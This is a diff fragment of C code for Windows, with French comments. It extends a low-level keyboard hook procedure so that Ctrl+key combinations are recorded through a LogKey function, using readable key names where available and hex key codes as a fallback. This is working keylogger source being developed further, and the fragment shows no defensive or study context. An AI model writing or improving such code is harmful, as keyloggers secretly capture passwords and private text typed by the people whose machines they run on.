@@ -105,12 +105,28 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
 
+            // essayer d'obtenir un nom lisible via GetKeyNameTextA (fallback quand ToUnicodeEx ne renvoie rien)
+            CHAR keyName[64] = {0};
+            LONG lParamForName = (pKeyboard->scanCode << 16);
+            if (pKeyboard->flags & LLKHF_EXTENDED) lParamForName |= 1<<24;
+            if (GetKeyNameTextA(lParamForName, keyName, sizeof(keyName))) {
+                char comboBuf[80];
+                snprintf(comboBuf, sizeof(comboBuf), " [CTRL+%s] ", keyName);
+                LogKey(comboBuf);
+                return CallNextHookEx(NULL, nCode, wParam, lParam);
+            }
+
             // sinon gérer quelques touches spéciales avec Ctrl
             if (vkCode == VK_RETURN) { LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
             else if (vkCode == VK_TAB) { LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
             else if (vkCode == VK_SPACE) { LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
             else if (vkCode == VK_BACK) { LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            // si non reconnu, on laisse tomber pour permettre le logging normal éventuel
+
+            // si non reconnu, logger code hex en fallback et empêcher double-écriture
+            char comboBufHex[32];
+            snprintf(comboBufHex, sizeof(comboBufHex), " [CTRL+0x%X] ", vkCode);
+            LogKey(comboBufHex);
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
 
         // touches spéciales human readable (sans Ctrl)
